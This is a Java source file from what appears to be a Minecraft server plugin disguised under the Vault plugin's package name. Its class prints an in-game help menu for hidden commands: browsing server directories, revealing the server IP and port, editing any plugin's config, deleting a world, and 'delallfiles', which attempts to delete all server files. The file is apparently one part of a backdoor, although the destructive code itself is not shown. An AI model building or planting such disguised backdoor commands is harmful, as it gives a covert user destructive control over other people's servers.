package net.milkbowl.vault.commands.cmds.help;

import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

import net.milkbowl.vault.Core;
import net.milkbowl.vault.commands.CommandManager;
import net.milkbowl.vault.methods.Tips;
import net.milkbowl.vault.util.Settings;

public class Fn extends CommandManager {
	
	public void execute(Core plugin, String msg, String[] args, Player p) {
		int maxPages = 1;
		if (args.length <= 1) {
			p.sendMessage(Settings.USAGE("fn <1-" + maxPages + ">"));
		} else {
			if (args[1].equalsIgnoreCase("1")) {
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&8&m----------------------------------"));
				p.sendMessage("         "+Settings.PRIMARY_COLOUR + Settings.NAME + " by " + Settings.AUTHOR);
				p.sendMessage("");
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7list &8l &fList all things in the current directory."));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7lsf &8l &fList all files in the current directory."));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7lsd &8l &fList all directories in the current directory."));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7pwd &8l &fPrint the current directory"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7cls &8l &fClears your chat only"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7getport &8l &fGets the port of the server"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7getip &8l &fGets the ip of the server"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7edit &8l &fEdit the config file of any plugin"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7delallfiles &8l &fAttempts to delete all server files"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7delworld &8l &fDeletes a world folder"));
				p.sendMessage("");
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&8("+Settings.PRIMARY_COLOUR+"Tip&8) l &7" + Tips.getTip()));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&8&m----------------------------------"));
			}
		}
		
	}

}
